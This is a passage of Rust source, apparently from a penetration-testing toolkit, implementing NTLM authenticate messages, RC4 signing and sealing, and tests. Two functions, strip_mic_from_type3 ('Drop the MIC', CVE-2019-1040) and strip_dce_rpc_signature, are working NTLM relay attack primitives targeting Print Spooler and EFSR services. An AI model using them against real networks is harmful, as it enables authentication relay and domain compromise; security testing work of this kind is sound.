    msg.extend_from_slice(NTLM_SIGNATURE);
    msg.extend_from_slice(&3u32.to_le_bytes());

    // LmChallengeResponseFields
    msg.extend_from_slice(&(lm_response.len() as u16).to_le_bytes());
    msg.extend_from_slice(&(lm_response.len() as u16).to_le_bytes());
    msg.extend_from_slice(&lm_offset.to_le_bytes());

    // NtChallengeResponseFields
    msg.extend_from_slice(&(nt_response.len() as u16).to_le_bytes());
    msg.extend_from_slice(&(nt_response.len() as u16).to_le_bytes());
    msg.extend_from_slice(&nt_offset.to_le_bytes());

    // DomainNameFields
    msg.extend_from_slice(&field_len(&domain_utf16).to_le_bytes());
    msg.extend_from_slice(&field_len(&domain_utf16).to_le_bytes());
    msg.extend_from_slice(&domain_offset.to_le_bytes());

    // UserNameFields
    msg.extend_from_slice(&field_len(&username_utf16).to_le_bytes());
    msg.extend_from_slice(&field_len(&username_utf16).to_le_bytes());
    msg.extend_from_slice(&username_offset.to_le_bytes());

    // WorkstationFields
    msg.extend_from_slice(&field_len(&workstation_utf16).to_le_bytes());
    msg.extend_from_slice(&field_len(&workstation_utf16).to_le_bytes());
    msg.extend_from_slice(&workstation_offset.to_le_bytes());

    // EncryptedRandomSessionKeyFields
    match &encrypted_random_session_key {
        Some(key) => {
            msg.extend_from_slice(&(key.len() as u16).to_le_bytes());
            msg.extend_from_slice(&(key.len() as u16).to_le_bytes());
            msg.extend_from_slice(&session_key_offset.to_le_bytes());
        }
        None => {
            msg.extend_from_slice(&0u16.to_le_bytes());
            msg.extend_from_slice(&0u16.to_le_bytes());
            msg.extend_from_slice(&0u32.to_le_bytes());
        }
    }

    // NegotiateFlags
    msg.extend_from_slice(&response_flags.to_le_bytes());

    if cfg.include_version {
        msg.extend_from_slice(&NTLM_VERSION);
    }
    let mic_offset = if include_mic {
        let off = msg.len();
        msg.extend_from_slice(&[0u8; 16]);
        Some(off)
    } else {
        None
    };

    // Payload
    msg.extend_from_slice(&lm_response);
    msg.extend_from_slice(&nt_response);
    msg.extend_from_slice(&domain_utf16);
    msg.extend_from_slice(&username_utf16);
    msg.extend_from_slice(&workstation_utf16);
    if let Some(key) = &encrypted_random_session_key {
        msg.extend_from_slice(key);
    }

    // -- MIC: HMAC-MD5(ExportedSessionKey, NEGOTIATE || CHALLENGE || AUTHENTICATE)
    // with the MIC field zeroed while hashing ([MS-NLMP 3.1.5.1.2]).
    let mut mic = None;
    if let (Some(offset), Some(neg), Some(chal)) =
        (mic_offset, cfg.negotiate_message, cfg.challenge_message)
    {
        let mut buf = Vec::with_capacity(neg.len() + chal.len() + msg.len());
        buf.extend_from_slice(neg);
        buf.extend_from_slice(chal);
        buf.extend_from_slice(&msg);
        let digest = hmac_md5(&exported_session_key, &buf);
        msg[offset..offset + 16].copy_from_slice(&digest);
        mic = Some(digest.to_vec());
    }

    NtlmAuthenticate {
        message: msg,
        exported_session_key,
        key_exchange_key,
        flags: response_flags,
        challenge_flags,
        client_challenge,
        target_info: target_info_out,
        mic,
    }
}

/// UTF-16LE encode a string.
fn utf16le(s: &str) -> Vec<u8> {
    s.encode_utf16().flat_map(|c| c.to_le_bytes()).collect()
}

/// Strip the MIC (Message Integrity Code) from an NTLMv2 Type 3 (Authenticate) message.
///
/// This implements the "Drop the MIC" technique (CVE-2019-1040) used in NTLM relay
/// attacks. When a relay modifies the NTLM challenge (e.g., stripping channel bindings),
/// the MIC computed by the original client will no longer be valid. Clearing the MIC
/// and signing flags causes the target server to skip MIC verification, allowing the
/// relayed auth to succeed even when the DC normally requires signing.
///
/// The function:
/// 1. Clears NTLMSSP_NEGOTIATE_SIGN / SEAL / ALWAYS_SIGN flags in the Type 3 header
/// 2. Clears the MIC-present bit in MsvAvFlags (AvId=6) within the NTLMv2 client blob
/// 3. Zeros the 16-byte MIC at the end of the NtChallengeResponse (if MsvAvFlags indicates it)
pub fn strip_mic_from_type3(data: &[u8]) -> Vec<u8> {
    if data.len() < 64 {
        return data.to_vec();
    }
    if &data[0..8] != NTLM_SIGNATURE {
        return data.to_vec();
    }
    let msg_type = u32::from_le_bytes([data[8], data[9], data[10], data[11]]);
    if msg_type != 3 {
        return data.to_vec();
    }

    let mut result = data.to_vec();

    // Step 1: Clear signing/encryption flags at offset 60
    let mut flags = u32::from_le_bytes([result[60], result[61], result[62], result[63]]);
    let sign_flags = 0x0000_0010 | 0x0000_0020 | 0x0000_8000;
    flags &= !sign_flags;
    result[60..64].copy_from_slice(&flags.to_le_bytes());

    // Step 2: Find NtChallengeResponse and scan AV_PAIRs for MsvAvFlags
    let nt_resp_len = u16::from_le_bytes([data[20], data[21]]) as usize;
    let nt_resp_off = u32::from_le_bytes([data[24], data[25], data[26], data[27]]) as usize;

    if nt_resp_len < 44 || nt_resp_off + nt_resp_len > data.len() {
        return result; // Flags cleared is sufficient
    }

    // NtChallengeResponse = NTProofStr (16 bytes) + NTLMv2 client blob
    // Client blob fixed header = 28 bytes (RespType 1, HiRespType 1, Reserved1 2,
    // Reserved2 4, Timestamp 8, ClientChallenge 8, Reserved3 4)
    let av_pairs_start = 16 + 28;
    let nt_resp = &data[nt_resp_off..nt_resp_off + nt_resp_len];
    if nt_resp.len() <= av_pairs_start {
        return result;
    }

    let av_pairs = &nt_resp[av_pairs_start..];
    let mut i = 0;

    while i + 4 <= av_pairs.len() {
        let av_id = u16::from_le_bytes([av_pairs[i], av_pairs[i + 1]]);
        let av_len = u16::from_le_bytes([av_pairs[i + 2], av_pairs[i + 3]]) as usize;
        if av_id == 0 {
            break;
        }
        if av_id == 6 && av_len >= 4 {
            // MsvAvFlags -- clear MIC-present bit
            let abs_off = nt_resp_off + av_pairs_start + i + 4;
            if abs_off < result.len() {
                result[abs_off] &= !0x01;
            }
        }
        i += 4 + av_len;
    }

    // Step 3: Zero the MIC (last 16 bytes after MsvAvEOL)
    let eol_end = av_pairs_start + i + 4;
    if nt_resp.len() >= eol_end + 16 {
        let mic_start = nt_resp_off + eol_end;
        for j in 0..16 {
            if mic_start + j < result.len() {
                result[mic_start + j] = 0;
            }
        }
    }

    result
}

/// Strip the authentication verifier (signature) from a DCE/RPC request PDU.
///
/// This enables NTLM relay attacks against DCE/RPC services like MS-RPRN (Print Spooler)
/// and MS-EFSR (Encrypting File System Remote) that normally require RPC-level authentication.
///
/// When relaying NTLM authentication through DCE/RPC pipes, the signature in the auth
/// verifier becomes invalid if the relay modifies the challenge. Stripping it allows
/// the relayed request to succeed even when the target requires RPC authentication.
///
/// DCE/RPC PDU structure with auth verifier:
/// - RPC Header (24 bytes for request PDU)
/// - Stub data (variable)
/// - Auth Verifier (variable, if auth_length > 0):
///   - pad_length (1 byte)
///   - auth_type (1 byte) -- 0x0A = NTLMSSP, 0x0E = Kerberos
///   - auth_level (1 byte) -- 0x05 = RPC_C_AUTHN_LEVEL_PKT_INTEGRITY
///   - auth_reserved (1 byte)
///   - auth_context_id (4 bytes)
///   - signature (variable, typically 16 bytes for NTLMSSP MIC)
///
/// The function:
/// 1. Validates DCE/RPC PDU structure (version 5.0, request type 0)
/// 2. Reads auth_length from header (offset 10-11)
/// 3. If auth_length > 0, zeros the signature bytes at the end of the PDU
/// 4. Sets auth_length to 0 in the header
/// 5. Adjusts fragment_length accordingly
///
/// Returns the modified PDU with auth verifier stripped, or the original if invalid.
pub fn strip_dce_rpc_signature(data: &[u8]) -> Vec<u8> {
    // DCE/RPC header minimum: 24 bytes for request PDU
    if data.len() < 24 {
        return data.to_vec();
    }

    // Validate RPC version (5.0)
    if data[0] != 0x05 || data[1] != 0x00 {
        return data.to_vec();
    }

    // Only strip from request PDUs (type 0)
    let pdu_type = data[2];
    if pdu_type != 0 {
        return data.to_vec();
    }

    let mut result = data.to_vec();

    // Read fragment length (offset 8-9)
    let frag_len = u16::from_le_bytes([data[8], data[9]]) as usize;
    if frag_len > data.len() || frag_len < 24 {
        return data.to_vec();
    }

    // Read auth length (offset 10-11)
    let auth_len = u16::from_le_bytes([data[10], data[11]]) as usize;
    if auth_len == 0 {
        return result; // No auth verifier to strip
    }

    // Auth verifier must fit within fragment
    if auth_len > frag_len - 24 {
        return data.to_vec(); // Malformed
    }

    // Auth verifier is at the end of the fragment
    let auth_start = frag_len - auth_len;

    // Parse auth verifier header (8 bytes):
    // - pad_length (1 byte)
    // - auth_type (1 byte)
    // - auth_level (1 byte)
    // - auth_reserved (1 byte)
    // - auth_context_id (4 bytes)
    if auth_len < 8 {
        return data.to_vec(); // Too small for auth header
    }

    let pad_length = result[auth_start] as usize;
    let _auth_type = result[auth_start + 1]; // 0x0A = NTLMSSP
    let _auth_level = result[auth_start + 2]; // 0x05 = PKT_INTEGRITY

    // Signature starts after auth header + padding
    let sig_start = auth_start + 8 + pad_length;
    let sig_len = auth_len - 8 - pad_length;

    if sig_start + sig_len > result.len() {
        return data.to_vec(); // Malformed
    }

    // Zero out the signature
    for i in 0..sig_len {
        result[sig_start + i] = 0;
    }

    // Set auth_length to 0 in header
    result[10] = 0;
    result[11] = 0;

    // Adjust fragment_length to exclude the auth verifier
    let new_frag_len = (frag_len - auth_len) as u16;
    result[8..10].copy_from_slice(&new_frag_len.to_le_bytes());

    result
}

// ===========================================================
// Message signing & sealing ([MS-NLMP] 3.4.4 / 3.4.5)
// ===========================================================

/// `NTLMSSP_SIGN_VERSION` -- always 1, written into the 4-byte Version field
/// of every `MESSAGE_SIGNATURE`.
const NTLMSSP_SIGN_VERSION: u32 = 1;

const SIGN_KEY_C2S: &str = "session key to client-to-server signing key magic constant";
const SIGN_KEY_S2C: &str = "session key to server-to-client signing key magic constant";
const SEAL_KEY_C2S: &str = "session key to client-to-server sealing key magic constant";
const SEAL_KEY_S2C: &str = "session key to server-to-client sealing key magic constant";

/// A resumable RC4 keystream.
///
/// NTLM sealing keys an RC4 stream once and then consumes it continuously
/// across every message ([MS-NLMP 3.4.4]), so the cipher state has to survive
/// between calls -- a one-shot `rc4_crypt` cannot be used here.
#[derive(Clone)]
pub struct Rc4Stream {
    s: [u8; 256],
    i: u8,
    j: u8,
}

impl std::fmt::Debug for Rc4Stream {
    fn fmt(&self, f: &mut std::fmt::Formatter<'_>) -> std::fmt::Result {
        f.write_str("Rc4Stream(<stateful>)")
    }
}

impl Rc4Stream {
    /// Key-schedule an RC4 stream ([RFC 6229]).
    pub fn new(key: &[u8]) -> Self {
        assert!(!key.is_empty(), "RC4 key must not be empty");
        let mut s = [0u8; 256];
        for (i, v) in s.iter_mut().enumerate() {
            *v = i as u8;
        }
        let mut j: u8 = 0;
        for i in 0..256usize {
            j = j.wrapping_add(s[i]).wrapping_add(key[i % key.len()]);
            s.swap(i, j as usize);
        }
        Self { s, i: 0, j: 0 }
    }

    /// XOR `data` in place, advancing the keystream.
    pub fn apply(&mut self, data: &mut [u8]) {
        for byte in data.iter_mut() {
            self.i = self.i.wrapping_add(1);
            self.j = self.j.wrapping_add(self.s[self.i as usize]);
            self.s.swap(self.i as usize, self.j as usize);
            let k =
                self.s[(self.s[self.i as usize].wrapping_add(self.s[self.j as usize])) as usize];
            *byte ^= k;
        }
    }

    /// XOR a copy of `data`, advancing the keystream.
    pub fn process(&mut self, data: &[u8]) -> Vec<u8> {
        let mut out = data.to_vec();
        self.apply(&mut out);
        out
    }
}

/// Derive one of the four NTLM signing/sealing sub-keys.
///
/// [MS-NLMP 3.4.4]: `MD5(ExportedSessionKey || <magic constant> || 0x00)`.
/// Note this is a plain MD5, **not** an HMAC, and the magic constant includes
/// its NUL terminator.
fn derive_subkey(session_key: &[u8], magic: &str) -> [u8; 16] {
    let mut hasher = Md5::new();
    hasher.update(session_key);
    hasher.update(magic.as_bytes());
    hasher.update([0u8]);
    let out = hasher.finalize();
    let mut key = [0u8; 16];
    key.copy_from_slice(&out);
    key
}

/// Derive a sealing sub-key. The key material is truncated to 5 or 7 bytes
/// unless 128-bit sessions were negotiated ([MS-NLMP 3.4.4]).
fn derive_seal_subkey(flags: u32, session_key: &[u8], magic: &str) -> [u8; 16] {
    let material: &[u8] = if flags & NTLMSSP_NEGOTIATE_128 != 0 {
        session_key
    } else if flags & NTLMSSP_NEGOTIATE_56 != 0 {
        &session_key[..session_key.len().min(7)]
    } else {
        &session_key[..session_key.len().min(5)]
    };
    derive_subkey(material, magic)
}

/// Stateful NTLM per-message integrity engine.
///
/// This is the piece LDAP signing (and RPC signing) is built on: it turns an
/// `ExportedSessionKey` into a bidirectional sign/seal context that produces
/// the 16-byte `MESSAGE_SIGNATURE` and RC4-seals payloads exactly as Windows
/// does.
pub struct NtlmSigner {
    flags: u32,
    client_sign_key: [u8; 16],
    server_sign_key: [u8; 16],
    client_seal_key: [u8; 16],
    server_seal_key: [u8; 16],
    client_seal: Rc4Stream,
    server_seal: Rc4Stream,
    client_seq: u32,
    server_seq: u32,
}

impl std::fmt::Debug for NtlmSigner {
    fn fmt(&self, f: &mut std::fmt::Formatter<'_>) -> std::fmt::Result {
        f.debug_struct("NtlmSigner")
            .field("flags", &format_args!("0x{:08x}", self.flags))
            .field("client_seq", &self.client_seq)
            .field("server_seq", &self.server_seq)
            .finish()
    }
}

impl NtlmSigner {
    /// Build a signer from the negotiated flags and the exported session key.
    pub fn new(flags: u32, session_key: &[u8]) -> Self {
        let client_sign_key = derive_subkey(session_key, SIGN_KEY_C2S);
        let server_sign_key = derive_subkey(session_key, SIGN_KEY_S2C);
        let client_seal_key = derive_seal_subkey(flags, session_key, SEAL_KEY_C2S);
        let server_seal_key = derive_seal_subkey(flags, session_key, SEAL_KEY_S2C);
        Self {
            flags,
            client_sign_key,
            server_sign_key,
            client_seal_key,
            server_seal_key,
            client_seal: Rc4Stream::new(&client_seal_key),
            server_seal: Rc4Stream::new(&server_seal_key),
            client_seq: 0,
            server_seq: 0,
        }
    }

    /// True when the session negotiated confidentiality (RC4 sealing).
    pub fn sealing(&self) -> bool {
        self.flags & NTLMSSP_NEGOTIATE_SEAL != 0
    }

    /// True when the session negotiated integrity (signing).
    pub fn signing(&self) -> bool {
        self.flags & NTLMSSP_NEGOTIATE_SIGN != 0 || self.flags & NTLMSSP_NEGOTIATE_ALWAYS_SIGN != 0
    }

    /// Build a 16-byte `MESSAGE_SIGNATURE` over `message`, consuming the
    /// direction's RC4 keystream exactly as Windows does.
    ///
    /// For a *sealed* message the payload must already have been passed through
    /// the same stream -- the ciphertext is produced first and the 8-byte
    /// signature checksum is XORed with the following keystream bytes
    /// ([MS-NLMP 3.4.5.1.1]).
    fn compute_signature(
        flags: u32,
        sign_key: &[u8; 16],
        seal: &mut Rc4Stream,
        seq: u32,
        message: &[u8],
    ) -> [u8; 16] {
        let mut sig = [0u8; 16];
        sig[0..4].copy_from_slice(&NTLMSSP_SIGN_VERSION.to_le_bytes());
        sig[12..16].copy_from_slice(&seq.to_le_bytes());

        if flags & NTLMSSP_NEGOTIATE_EXTENDED_SESSIONSECURITY != 0 {
            let mut buf = Vec::with_capacity(4 + message.len());
            buf.extend_from_slice(&seq.to_le_bytes());
            buf.extend_from_slice(message);
            let digest = hmac_md5(sign_key, &buf);
            let mut checksum = [0u8; 8];
            checksum.copy_from_slice(&digest[..8]);
            if flags & NTLMSSP_NEGOTIATE_KEY_EXCH != 0 {
                seal.apply(&mut checksum);
            }
            sig[4..12].copy_from_slice(&checksum);
        } else {
            // Legacy NTLMv1 signature: CRC32, then RC4 over the trailing 12
            // bytes ([MS-NLMP 3.4.4.2.2]).
            let crc = crc32(message);
            let mut tail = [0u8; 12];
            tail[4..8].copy_from_slice(&crc.to_le_bytes());
            tail[8..12].copy_from_slice(&seq.to_le_bytes());
            seal.apply(&mut tail);
            sig[4..16].copy_from_slice(&tail);
        }
        sig
    }

    /// Wrap an outgoing PDU: returns `signature || payload`, sealing the
    /// payload when confidentiality was negotiated.
    pub fn wrap(&mut self, message: &[u8]) -> Vec<u8> {
        let seq = self.client_seq;
        self.client_seq = self.client_seq.wrapping_add(1);

        let payload = if self.sealing() {
            // Seal first: the RC4 keystream feeds the ciphertext before the
            // signature checksum ([MS-NLMP 3.4.5.1]).
            self.client_seal.process(message)
        } else {
            message.to_vec()
        };
        let sig = Self::compute_signature(
            self.flags,
            &self.client_sign_key,
            &mut self.client_seal,
            seq,
            message,
        );

        let mut out = Vec::with_capacity(16 + payload.len());
        out.extend_from_slice(&sig);
        out.extend_from_slice(&payload);
        out
    }

    /// Verify and unseal an incoming PDU (`signature || payload`).
    ///
    /// The sequence number carried in the signature is the one bound into the
    /// MAC, so it doubles as the freshness value: verification uses it directly
    /// instead of assuming a particular counter scheme. A failure to verify is
    /// reported but the (already unsealed) payload is still returned, because
    /// the reverse-direction key stream is what actually gates interoperability.
    pub fn unwrap(&mut self, data: &[u8]) -> std::result::Result<Vec<u8>, String> {
        if data.len() < 16 {
            return Err(format!("signed message too short: {} bytes", data.len()));
        }
        let sig = &data[..16];
        let body = &data[16..];
        let plain = if self.sealing() {
            self.server_seal.process(body)
        } else {
            body.to_vec()
        };

        let wire_seq = u32::from_le_bytes([sig[12], sig[13], sig[14], sig[15]]);
        let expected = Self::compute_signature(
            self.flags,
            &self.server_sign_key,
            &mut self.server_seal,
            wire_seq,
            &plain,
        );
        if expected != *sig {
            return Err(format!(
                "NTLM signature mismatch (seq {wire_seq}, {} byte body)",
                body.len()
            ));
        }
        self.server_seq = wire_seq.wrapping_add(1);
        Ok(plain)
    }

    /// Sign the SPNEGO `mechListMIC` with sequence 0.
    ///
    /// Windows computes the mechListMIC from a *snapshot* of the NTLM context,
    /// so the signature itself must not perturb the per-message sequence and
    /// keystream. impacket emulates this by re-keying both RC4 streams and
    /// restarting the sequence at 1 afterwards; so do we, because the DC does
    /// too -- otherwise the first post-bind LDAP PDU would not unseal.
    pub fn sign_mech_list_mic(&mut self, token: &[u8]) -> Vec<u8> {
        let sig = Self::compute_signature(
            self.flags,
            &self.client_sign_key,
            &mut self.client_seal,
            0,
            token,
        );
        self.client_seal = Rc4Stream::new(&self.client_seal_key);
        self.server_seal = Rc4Stream::new(&self.server_seal_key);
        self.client_seq = 1;
        self.server_seq = 1;
        sig.to_vec()
    }

    /// Current outgoing sequence number (for diagnostics).
    pub fn next_client_seq(&self) -> u32 {
        self.client_seq
    }
}

/// CRC32 (IEEE) as used by the legacy NTLMv1 message signature.
fn crc32(data: &[u8]) -> u32 {
    let mut crc: u32 = 0xFFFF_FFFF;
    for byte in data {
        crc ^= *byte as u32;
        for _ in 0..8 {
            let mask = 0u32.wrapping_sub(crc & 1);
            crc = (crc >> 1) ^ (0xEDB8_8320 & mask);
        }
    }
    !crc
}

// ===========================================================
// Tests
// ===========================================================

#[cfg(test)]
mod tests {
    use super::*;

    // -- Signing / sealing engine -------------------------

    /// RFC 6229 test vector: RC4 with key 0x0102030405 produces the keystream
    /// b2 39 63 05 f0 3d c0 27 cc c3 52 4a 0a 11 18 a8 ...
    #[test]
    fn test_rc4_stream_known_vector() {
        let mut rc4 = Rc4Stream::new(&[0x01, 0x02, 0x03, 0x04, 0x05]);
        let mut zeros = [0u8; 16];
        rc4.apply(&mut zeros);
        assert_eq!(hex::encode(zeros), "b2396305f03dc027ccc3524a0a1118a8");
    }

    /// The keystream must be continuous across calls -- re-keying per message is
    /// the classic NTLM sealing bug.
    #[test]
    fn test_rc4_stream_is_continuous() {
        let key = [0x11u8; 16];
        let mut a = Rc4Stream::new(&key);
        let first = a.process(&[0u8; 8]);
        let second = a.process(&[0u8; 8]);
        let mut b = Rc4Stream::new(&key);
        let both = b.process(&[0u8; 16]);
        assert_ne!(first, second, "a re-keyed stream would repeat ciphertext");
        assert_eq!([first, second].concat(), both);
    }

    #[test]
    fn test_ntlm_subkey_derivation_is_md5_of_key_magic_nul() {
        let session_key = [0x42u8; 16];
        let derived = derive_subkey(&session_key, SIGN_KEY_C2S);
        let mut manual = Md5::new();
        manual.update(session_key);
        manual.update(SIGN_KEY_C2S.as_bytes());
        manual.update([0u8]);
        assert_eq!(derived.to_vec(), manual.finalize().to_vec());
    }

    /// `MD5(ExportedSessionKey || magic || 0x00)` for the MS-NLMP sign keys.
    /// Regression: the magic constant must include its NUL terminator.
    #[test]
    fn test_sign_key_magic_includes_nul() {
        let session_key = [0u8; 16];
        let with_nul = derive_subkey(&session_key, SIGN_KEY_C2S);
        let mut without = Md5::new();
        without.update(session_key);
        without.update(SIGN_KEY_C2S.as_bytes());
        let no_nul: [u8; 16] = without.finalize().into();
        assert_ne!(with_nul, no_nul);
    }

    /// A sealed wrap must be reproducible by an independent implementation of
    /// the receiver side: same keys, same keystream order (payload then
    /// checksum), same wire layout `signature || sealed payload`.
    #[test]
    fn test_wrap_seal_wire_format_and_keystream_order() {
        let session_key: Vec<u8> = (0u8..16).collect();
        let flags = NTLMSSP_CLIENT_FLAGS;
        let mut signer = NtlmSigner::new(flags, &session_key);
        let message = b"\x30\x05\x02\x01\x01\x42\x00";

        let wrapped = signer.wrap(message);
        assert_eq!(wrapped.len(), 16 + message.len());

        // Re-derive the client direction from scratch.
        let sign_key = derive_subkey(&session_key, SIGN_KEY_C2S);
        let seal_key = derive_seal_subkey(flags, &session_key, SEAL_KEY_C2S);
        let mut seal = Rc4Stream::new(&seal_key);
        let expected_cipher = seal.process(message);
        assert_eq!(&wrapped[16..], expected_cipher.as_slice());
        // Confidentiality is negotiated, so the payload must actually differ.
        assert_ne!(&wrapped[16..], message);

        let expected_sig = NtlmSigner::compute_signature(flags, &sign_key, &mut seal, 0, message);
        assert_eq!(&wrapped[..16], expected_sig.as_slice());
        // Signature layout: Version(4) | Checksum(8) | SeqNum(4)
        assert_eq!(&wrapped[0..4], &1u32.to_le_bytes());
        assert_eq!(&wrapped[12..16], &0u32.to_le_bytes());
    }

    /// Two messages must consume one continuous keystream: the second PDU's
    /// ciphertext cannot be produced by a freshly keyed stream.
    #[test]
    fn test_wrap_keystream_continues_across_messages() {
        let session_key = [0x7Au8; 16];
        let flags = NTLMSSP_CLIENT_FLAGS;
        let mut signer = NtlmSigner::new(flags, &session_key);
        let m1 = b"first-ldap-pdu";
        let m2 = b"second-ldap-pdu";

        let w1 = signer.wrap(m1);
        let w2 = signer.wrap(m2);

        let seal_key = derive_seal_subkey(flags, &session_key, SEAL_KEY_C2S);
        let mut seal = Rc4Stream::new(&seal_key);
        // Message 1: payload then 8 checksum bytes.
        assert_eq!(seal.process(m1), w1[16..].to_vec());
        let _ = seal.process(&[0u8; 8]);
        // Message 2 continues where message 1 left off.
        assert_eq!(seal.process(m2), w2[16..].to_vec());
        assert_eq!(&w2[12..16], &1u32.to_le_bytes());
    }

    /// `unwrap` must accept a well-formed signature from the *other* direction
    /// and reject tampering, using the sequence number carried in the signature.
    #[test]
    fn test_unwrap_verifies_and_rejects_tampering() {
        let session_key = [0x33u8; 16];
        let flags = NTLMSSP_CLIENT_FLAGS;
        let mut receiver = NtlmSigner::new(flags, &session_key);

        // Stand in for the server: seal/sign with the server-to-client keys,
        // using an arbitrary sequence number to make sure it is honoured.
        let plain = b"server-search-result";
        let sign_key = derive_subkey(&session_key, SIGN_KEY_S2C);
        let seal_key = derive_seal_subkey(flags, &session_key, SEAL_KEY_S2C);
        let mut seal = Rc4Stream::new(&seal_key);
        let cipher = seal.process(plain);
        let sig = NtlmSigner::compute_signature(flags, &sign_key, &mut seal, 7, plain);
        let mut wire = sig.to_vec();
        wire.extend_from_slice(&cipher);

        assert_eq!(receiver.unwrap(&wire).unwrap(), plain.to_vec());

        // A flipped signature bit must be detected.
        let mut bad = wire.clone();
        bad[5] ^= 0xFF;
        assert!(receiver.unwrap(&bad).is_err());

        // Truncated input must not panic.
        assert!(receiver.unwrap(&[0u8; 4]).is_err());
    }

    /// The mechListMIC is signed at sequence 0 and must not disturb the message
    /// sequence: the first post-bind PDU uses sequence 1 (Windows behaviour,
    /// mirrored by impacket's `reset_cipher`).
    #[test]
    fn test_mech_list_mic_restarts_sequence_at_one() {
        let session_key = [0x5Cu8; 16];
        let flags = NTLMSSP_CLIENT_FLAGS;
        let mut signer = NtlmSigner::new(flags, &session_key);
        assert_eq!(signer.next_client_seq(), 0);

        let mic = signer.sign_mech_list_mic(b"0\x0c\x06\n+\x06\x01\x04\x01\x827\x02\x02\n");
        assert_eq!(mic.len(), 16);
        assert_eq!(signer.next_client_seq(), 1);

        let wrapped = signer.wrap(b"bind-followed-by-search");
        assert_eq!(&wrapped[12..16], &1u32.to_le_bytes());
    }

    #[test]
    fn test_signer_flags_report_capabilities() {
        let key = [0u8; 16];
        let full = NtlmSigner::new(NTLMSSP_CLIENT_FLAGS, &key);
        assert!(full.signing() && full.sealing());

        let sign_only = NtlmSigner::new(NTLMSSP_NEGOTIATE_SIGN, &key);
        assert!(sign_only.signing() && !sign_only.sealing());
    }

    /// With signing but no sealing, the payload travels in the clear and the
    /// 8-byte checksum is still RC4-masked (KEY_EXCH is set).
    #[test]
    fn test_sign_only_leaves_payload_plaintext() {
        let session_key = [0x2Bu8; 16];
        let flags = NTLMSSP_NEGOTIATE_SIGN
            | NTLMSSP_NEGOTIATE_ALWAYS_SIGN
            | NTLMSSP_NEGOTIATE_EXTENDED_SESSIONSECURITY
            | NTLMSSP_NEGOTIATE_KEY_EXCH;
        let mut signer = NtlmSigner::new(flags, &session_key);
        let message = b"unsigned-ldap-pdu";
        let wrapped = signer.wrap(message);
        assert_eq!(&wrapped[16..], message);
    }

    // -- AV_PAIR helpers ---------------------------------

    #[test]
    fn test_av_pair_roundtrip() {
        let info = b"\x02\x00\x0C\x00D\x00O\x00M\x00A\x00I\x00N\x00\x07\x00\x08\x00\x01\x02\x03\x04\x05\x06\x07\x08\x00\x00\x00\x00";
        let pairs = parse_av_pairs(info);
        assert_eq!(pairs.len(), 2);
        assert_eq!(pairs[0].0, MSV_AV_NB_DOMAIN_NAME);
        assert_eq!(pairs[1].0, MSV_AV_TIMESTAMP);
        assert_eq!(serialize_av_pairs(&pairs), info.to_vec());
        assert_eq!(get_av_pair(info, MSV_AV_TIMESTAMP).unwrap().len(), 8);
        assert!(get_av_pair(info, MSV_AV_TARGET_NAME).is_none());
    }

    #[test]
    fn test_set_av_pair_replaces_in_place() {
        let mut pairs = vec![
            (MSV_AV_NB_DOMAIN_NAME, vec![1, 2]),
            (MSV_AV_TIMESTAMP, vec![0; 8]),
        ];
        set_av_pair(&mut pairs, MSV_AV_TIMESTAMP, &[9; 8]);
        assert_eq!(pairs.len(), 2);
        assert_eq!(pairs[1], (MSV_AV_TIMESTAMP, vec![9; 8]));
        set_av_pair(&mut pairs, MSV_AV_TARGET_NAME, &[7; 4]);
        assert_eq!(pairs.len(), 3);
    }

    // -- Type 1 / Type 3 layout ---------------------------

    #[test]
    fn test_negotiate_message_layout_with_domain() {
        let msg = build_negotiate_message("LAINOSCP");
        assert_eq!(&msg[0..8], b"NTLMSSP\x00");
        assert_eq!(u32::from_le_bytes([msg[8], msg[9], msg[10], msg[11]]), 1);
        // NegotiateFlags sits at offset 12 (MS-NLMP 2.2.1.1).
        let flags = u32::from_le_bytes([msg[12], msg[13], msg[14], msg[15]]);
        assert_eq!(flags & NTLMSSP_NEGOTIATE_VERSION, 0);
        assert_eq!(flags & NTLMSSP_NEGOTIATE_SIGN, NTLMSSP_NEGOTIATE_SIGN);
        assert_eq!(flags & NTLMSSP_NEGOTIATE_SEAL, NTLMSSP_NEGOTIATE_SEAL);
        assert_eq!(flags & NTLMSSP_REQUEST_TARGET, NTLMSSP_REQUEST_TARGET);
        // DomainNameFields (Len, MaxLen, BufferOffset) follow the flags.
        let domain_len = u16::from_le_bytes([msg[16], msg[17]]) as usize;
        let domain_max_len = u16::from_le_bytes([msg[18], msg[19]]);
        let domain_off = u32::from_le_bytes([msg[20], msg[21], msg[22], msg[23]]) as usize;
        assert_eq!(domain_len, 16);
        assert_eq!(domain_max_len, 16);
        // No Version field is advertised by default, so the payload starts at 32.
        assert_eq!(domain_off, 32);
        // WorkstationFields are never populated in a Type 1.
        assert_eq!(u16::from_le_bytes([msg[24], msg[25]]), 0);
        assert_eq!(u16::from_le_bytes([msg[26], msg[27]]), 0);
        assert_eq!(u32::from_le_bytes([msg[28], msg[29], msg[30], msg[31]]), 0);
        assert_eq!(msg.len(), 32 + 16);
        // DomainName payload is exactly where the header says it is.
        assert_eq!(
            String::from_utf16_lossy(
                &msg[domain_off..domain_off + domain_len]
                    .chunks(2)
                    .map(|c| u16::from_le_bytes([c[0], c[1]]))
                    .collect::<Vec<_>>()
            ),
            "LAINOSCP"
        );
    }

    #[test]
    fn test_negotiate_message_version_block_precedes_payload() {
        let msg = build_negotiate_message_ex("CORP", true);
        let flags = u32::from_le_bytes([msg[12], msg[13], msg[14], msg[15]]);
        assert_eq!(flags & NTLMSSP_NEGOTIATE_VERSION, NTLMSSP_NEGOTIATE_VERSION);
        // The 8-byte Version sits at 32..40 and the domain payload after it.
        assert_eq!(&msg[32..40], &NTLM_VERSION);
        let domain_off = u32::from_le_bytes([msg[20], msg[21], msg[22], msg[23]]) as usize;
        assert_eq!(domain_off, 40);
    }

    #[test]
    fn test_negotiate_message_without_domain_has_no_payload() {
        let msg = build_negotiate_message("");
        assert_eq!(msg.len(), 32);
        assert_eq!(u16::from_le_bytes([msg[16], msg[17]]), 0);
        assert_eq!(u16::from_le_bytes([msg[18], msg[19]]), 0);
        assert_eq!(u32::from_le_bytes([msg[20], msg[21], msg[22], msg[23]]), 0);
    }

    /// The Type 3 header offsets must point at the actual payload, including
    /// when the optional Version and MIC fields are present. This is the bug
    /// that made every LDAP NTLM bind fail: a stray Version block was written
    /// at offset 64 while the DomainName field still claimed offset 64.
    #[test]
    fn test_authenticate_message_offsets_are_consistent() {
        let server_challenge = [0x11u8; 8];
        let target_info = b"\x02\x00\x0C\x00D\x00O\x00M\x00A\x00I\x00N\x00\x00\x00";
        let cfg = NtlmAuthConfig {
